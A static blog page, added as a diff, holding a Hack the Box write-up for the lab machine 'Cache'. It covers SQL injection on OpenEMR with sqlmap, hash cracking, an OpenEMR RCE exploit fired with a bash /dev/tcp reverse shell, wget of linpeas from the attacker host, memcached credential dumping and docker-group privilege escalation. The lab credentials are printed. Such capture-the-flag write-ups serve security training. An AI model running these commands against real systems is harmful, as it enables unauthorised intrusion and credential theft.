@@ -1,0 +1,303 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="author" content="">
+<meta name="description" content="Introduction IP: 10.10.10.172 Difficulty: Easy
+This is my write-up for the Hack the Box machine Cache.
+Initial nmap Scan Running the inital nmap scan:
+nmap -sV -sC -p- -oN nmap 10.10.10.188
+Yielded the following results:
+From these results, it shows that there are two ports open
+Port 80 apache web server
+Enumerating the Web Server Navigating to the web server, I am presented with this webpage
+I navigate through the webpage to try find some useful information" />
+<meta name="keywords" content="homepage, hacking, ctf, htb, hack, box, programming, blog, informatics, osint, ethical" />
+<meta name="robots" content="noodp" />
+<meta name="theme-color" content="" />
+<link rel="canonical" href="https://xyniath.github.io/write-ups/cache/" />
+
+
+    <title>
+        
+            Cache :: Xyniath  — Hacking and stuff
+        
+    </title>
+
+
+
+<link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.2.1/css/flag-icon.min.css" rel="stylesheet"
+    type="text/css">
+
+
+
+<link rel="stylesheet" href="/main.min.5dcefbf8102eb536dd3e2de53ffebfa58599ab2435c241a0db81728a5e015f2e.css">
+
+
+
+
+<meta itemprop="name" content="Cache">
+<meta itemprop="description" content="Write-up and walktrhough for the hack the box machine Cache">
+<meta itemprop="datePublished" content="2020-06-14T02:26:14&#43;01:00" />
+<meta itemprop="dateModified" content="2020-06-14T02:26:14&#43;01:00" />
+<meta itemprop="wordCount" content="885">
+<meta itemprop="image" content="https://xyniath.github.io/"/>
+
+
+
+<meta itemprop="keywords" content="CVE,Easy,Hack the Box,Write-up,Walkthrough,Docker,Hosts,Linux,Enumeration," /><meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://xyniath.github.io/"/>
+
+<meta name="twitter:title" content="Cache"/>
+<meta name="twitter:description" content="Write-up and walktrhough for the hack the box machine Cache"/>
+
+
+
+
+
+    <meta property="article:published_time" content="2020-06-14 02:26:14 &#43;0100 BST" />
+
+
+
+
+
+
+
+
+    </head>
+
+    <body class="">
+        <div class="container">
+            <header class="header">
+    <span class="header__inner">
+        <a href="/" style="text-decoration: none;">
+    <div class="logo">
+        
+            <span class="logo__mark">></span>
+            <span class="logo__text">cd ~/home/xyniath</span>
+            <span class="logo__cursor" style=""></span>
+        
+    </div>
+</a>
+
+
+        <span class="header__right">
+            
+                <nav class="menu">
+    <ul class="menu__inner"><li><a href="https://xyniath.github.io/about-me/">About Me</a></li><li><a href="https://xyniath.github.io/blog/">Blog</a></li><li><a href="https://xyniath.github.io/write-ups/">Write-Ups</a></li>
+    </ul>
+</nav>
+
+                <span class="menu-trigger">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                        <path d="M0 0h24v24H0z" fill="none"/>
+                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+                    </svg>
+                </span>
+            
+
+            <span class="theme-toggle unselectable"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+  <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
+</svg>
+</span>
+        </span>
+    </span>
+</header>
+
+
+            <div class="content">
+                
+    <main class="post">
+
+        <div class="post-info">
+            
+            </p>
+        </div>
+
+        <article>
+            <h2 class="post-title"><a href="https://xyniath.github.io/write-ups/cache/">Cache</a></h2>
+
+            
+
+            <div class="post-content">
+                <h2 id="introduction">Introduction</h2>
+<p><strong>IP</strong>: 10.10.10.172
+<strong>Difficulty</strong>: Easy</p>
+<p>This is my write-up for the Hack the Box machine Cache.</p>
+<h2 id="initial-nmap-scan">Initial nmap Scan</h2>
+<p>Running the inital <code>nmap</code> scan:</p>
+<p><code>nmap -sV -sC -p- -oN nmap 10.10.10.188</code></p>
+<p>Yielded the following results:</p>
+<p><img src="/posts/cache/nmapscan.png" alt="Nmap Scan"></p>
+<p>From these results, it shows that there are two ports open</p>
+<p><strong>Port 80</strong> apache web server</p>
+<h2 id="enumerating-the-web-server">Enumerating the Web Server</h2>
+<p>Navigating to the web server, I am presented with this webpage</p>
+<p><img src="/posts/cache/cachehomepage.png" alt="Homepage"></p>
+<p>I navigate through the webpage to try find some useful information</p>
+<h3 id="login-page">Login Page</h3>
+<p><img src="/posts/cache/cachelogin.png" alt="Login Page"></p>
+<p>The login page presents me with a login form, I tried to use some default credentials here to no success. I noticed that the website shows what input is incorrect -  which would be helpful when trying to brute-force usernames and passwords.</p>
+<p>My next step was to capture this login request with BurpSuite. To my surprise there was no post request. And with the username and password input having to be validated, the credentials must be compared locally (on my browser). To verify this, I check Firefox's debugger and there was a file called functionality.js</p>
+<p><img src="/posts/cache/functionalityjs.png" alt="Functionality.js"></p>
+<p>It looks like the webpage <em>was</em> validating the user input locally and I am presented with the plaintext username and password</p>
+<p><strong>USERNAME</strong> - ash</p>
+<p><strong>PASSWORD</strong> - H@v3_fun</p>
+<p>Sure enough, the credentials worked.</p>
+<p><img src="/posts/cache/construction.png" alt="Under Construction"></p>
+<p>Sadly, there was nothing beyond the login page apart from an &lsquo;Under Construction&rsquo; notice. Perhaps the credentials will be useful for later.</p>
+<h3 id="about">About</h3>
+<p><img src="/posts/cache/author.png" alt="Author Page"></p>
+<p>On here, there seems to be little information, however Ash mentioned another project of his &lsquo;HMS&rsquo;</p>
+<p>This led me to try edit my /etc/hosts file to add cache.htb and HMS.htb to it.</p>
+<p><img src="/posts/cache/hosts.png" alt="Hosts file"></p>
+<p>In the hopes of it working, it did.</p>
+<p><img src="/posts/cache/openemr.png" alt="OpenEMR portal"></p>
+<p>I checked the source code to see if any version details, or information were revealed. On the main page, there was the copyright notice which dated to 2018.</p>
+<p><em><strong>NB</strong> - I noticed that using other methods like fuzzing were less &ldquo;lucky&rdquo; to get the same result</em></p>
+<p>After some time I came across a video persisting of SQL injection:
+<a href="https://www.youtube.com/watch?v=DJSQ8Pk_7hc"><strong>OpenEMR Simulated Attack</strong></a></p>
+<h2 id="gaining-access-to-openemr">Gaining Access to OpenEMR</h2>
+<p>Explaining the steps in the video in context with Cache:</p>
+<ol>
+<li>Navigate to <code>HMS.htb/portal/add_edit_event_user/php?eid='</code>. I knew it was vulnerable when the following webpage was displayed:</li>
+</ol>
+<p><img src="/posts/cache/sqlerror.png" alt="SQL Error"></p>
+<ol start="2">
+<li>Open BurpSuite and reload the page to capture the request</li>
+</ol>
+<pre><code>GET /portal/add_edit_event_user.php?eid=%27 HTTP/1.1
+Host: hms.htb
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Cookie: PHPSESSID=cdghrt7lln9k1shbvtdmdkjr6n; OpenEMR=djap8b3iolchp81ipr95nj8il
+Upgrade-Insecure-Requests: 1
+Cache-Control: max-age=0
+</code></pre><ol start="3">
+<li>
+<p>Copy the request into a file - removing the <code>%27</code> on the first line of the request, and replacing it with a &lsquo;1&rsquo; - this makes the request valid so SQLmap can work effectively.</p>
+</li>
+<li>
+<p>Use SQLmap with the following command: <code>sqlmap -r &lt;request file&gt; --threads 10 --dbs</code></p>
+</li>
+</ol>
+<p><img src="/posts/cache/sqlmap.png" alt="SQL Map"></p>
+<p><code>sqlmap -r openemr.req --threads 10 --tables</code>
+Provides us with a list of tables, searching through here, we see the following tables:</p>
+<p><img src="/posts/cache/sqltables.png" alt="SQL Tables"></p>
+<p>Dumping the data of each table, users_secure contained some very interesting data</p>
+<p><img src="/posts/cache/userssecure.png" alt="SQL Tables"></p>
+<p><strong>USERNAME</strong> - openemr_admin</p>
+<p><strong>HASH</strong> - $2a$05$l2sTLIG6GTBeyBf7TAKL6.ttEwJDmxs9bI6LXqlfCpEcY6VF6P0B.</p>
+<p>### Cracking with John</p>
+<p>First, copy the hash into a file
+<code>john -w=/path/to/rockyou.txt hashfile</code> followed by:
+<code>john --show hashfile</code></p>
+<p><img src="/posts/cache/cracked.png" alt="Cracked Password"></p>
+<p>Now we have the password: xxxxxx</p>
+<p><img src="/posts/cache/loggedin.png" alt="Successful Log in"></p>
+<p>And successfully Logged in.</p>
+<h2 id="rce-exploit">RCE Exploit</h2>
+<p>After gaining access to OpenEMR, I found an exploit that matched with the version of OpenEMR. Which can be found on exploit db <a href="https://www.exploit-db.com/exploits/45161"><strong>HERE</strong></a></p>
+<p>This lets me remotely execute a single command from the server.</p>
+<p>For this to be effective, I searched for reverse shell bash one-liners, and I come across this:</p>
+<p><code>bash -i &gt;&amp; /dev/tcp/your_ip/your_port 0&gt;&amp;1</code></p>
+<p>Set up a netcat listener and execute the rce exploit</p>
+<p><code>nc -lvnp 7777</code></p>
+<p><code>python rce.py http://HMS.htb -u openemr_admin -p xxxxxx -c &quot;bash -i &gt;&amp; /dev/tcp/yourip/7777 0&gt;&amp;1&quot; </code></p>
+<p><img src="/posts/cache/shell.png" alt="Reverse Shell"></p>
+<p>I get a shell, running as www-data</p>
+<h2 id="gaining-user-1">Gaining User 1</h2>
+<p>The shell wasn't very stable at the moment so I tried spawn a TTY Shell, I do this by using <code>which python3</code>, which let me know that python3 was installed.</p>
+<p>To spawn a TTY shell with python3 I used:</p>
+<p><code>python3 -c 'import pty; pty.spawn(&quot;/bin/sh&quot;)'</code></p>
+<p>I navigate to the /home/ directory, and noticed that &lsquo;ash&rsquo; was present.</p>
+<p>Using the password I grabbed from the <code>functionality.js</code> I switched user:
+<img src="/posts/cache/switchuser.png" alt="SU"></p>
+<p>Navigating to the ash directory I got <code>user.txt</code></p>
+<h2 id="gaining-user-2">Gaining User 2</h2>
+<p>I downloaded linpeas.sh to my machine and used <code>python -m SimpleHTTPserver 80</code> to host the file and then download it from the box.</p>
+<p><code>wget &lt;yourip&gt;:80/linpeas.sh</code></p>
+<p><code>chmod +x linpeas.sh</code></p>
+<p>Whilst going through the results of linpeas, I noticed &lsquo;/usr/bin/memcached&rsquo; running on port 11211.</p>
+<p>it was running internally, so I decided to telnet into it.</p>
+<p><code>telnet 127.0l0.1 11211</code></p>
+<p>Using the following website, I learned how to exploit the server <a href="https://www.hackingarticles.in/penetration-testing-on-memcached-server/"><strong>HERE</strong></a></p>
+<p><code>stats slabs</code></p>
+<p><img src="/posts/cache/statsslabs.png" alt="stats slabs"></p>
+<p><img src="/posts/cache/cachedump.png" alt="stats cachedump 1 0"></p>
+<p>Dumping the cache, we see a user and password item. To view these, we use <code>get &lt;item&gt;</code></p>
+<p><code>get user</code>
+<img src="/posts/cache/getuser.png" alt="get user">
+<code>get passwd</code>
+<img src="/posts/cache/statsslabs.png" alt="stats slabs"></p>
+<p>So now we have another set of credentials!</p>
+<p><strong>USER</strong> - luffy</p>
+<p><strong>PASSWORD</strong> - 0n3_p1ec3</p>
+<p>I then switch user to luffy</p>
+<p><img src="/posts/cache/suluffy.png" alt="switch user luffy"></p>
+<p>Running <code>id</code> I find that luffy is part of the docker group</p>
+<p><img src="/posts/cache/luffyid.png" alt="luffy id"></p>
+<p>I found the docker binary in /usr/bin/ an decided to check gtfobins. And found<a href="https://gtfobins.github.io/gtfobins/docker/"><strong>Dockeer gtfobin</strong></a>
+<img src="/posts/cache/dockerbinary.png" alt="docker gtfobin"></p>
+<p>I check shell and find the command :
+<img src="/posts/cache/dockershell.png" alt="docker shell"></p>
+<p>Running this command shows that the <code>alpine</code> keyword is the image name , which was not present on this machine, so I run <code>docker images</code> to find the images on the machine. This showed that an ubuntu image was on the system.</p>
+<p>So, running:
+<img src="/posts/cache/root.png" alt="Exploit">
+Gave me root!</p>
+<p>Reading <code>/root/root.txt</code> gives me the root flag!</p>
+
+            </div>
+        </article>
+
+        <hr />
+
+        <div class="post-info">
+  				<p>
+  					<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line></svg><span class="tag"><a href="https://xyniath.github.io/tags/cve">CVE</a></span><span class="tag"><a href="https://xyniath.github.io/tags/easy">Easy</a></span><span class="tag"><a href="https://xyniath.github.io/tags/hack-the-box">Hack the Box</a></span><span class="tag"><a href="https://xyniath.github.io/tags/write-up">Write-up</a></span><span class="tag"><a href="https://xyniath.github.io/tags/walkthrough">Walkthrough</a></span><span class="tag"><a href="https://xyniath.github.io/tags/docker">Docker</a></span><span class="tag"><a href="https://xyniath.github.io/tags/hosts">Hosts</a></span><span class="tag"><a href="https://xyniath.github.io/tags/linux">Linux</a></span><span class="tag"><a href="https://xyniath.github.io/tags/enumeration">Enumeration</a></span>
+  				</p>
+  			</div>
+
+        
+    </main>
+
+            </div>
+
+            
+                <!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
+<html>
+<head>
+  <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+  <meta http-equiv="Content-Style-Type" content="text/css">
+  <title></title>
+  <meta name="Generator" content="Cocoa HTML Writer">
+  <meta name="CocoaVersion" content="1894.2">
+  <style type="text/css">
+  </style>
+</head>
+<body>
+</body>
+</html>
+
+            
+        </div>
+
+        
+
+
+
+
+<script type="text/javascript" src="/bundle.min.2d5469329143160ae2456a69c3c76dc2d0a3b212b46afe291a51bd68650ed6f8697e001dab54f1c272c77ce08092a8c55e5bb4314e0ee334aab4b927ec896638.js" integrity="sha512-LVRpMpFDFgriRWppw8dtwtCjshK0av4pGlG9aGUO1vhpfgAdq1TxwnLHfOCAkqjFXlu0MU4O4zSqtLkn7IlmOA=="></script>
+
+
+
+    </body>
+</html>
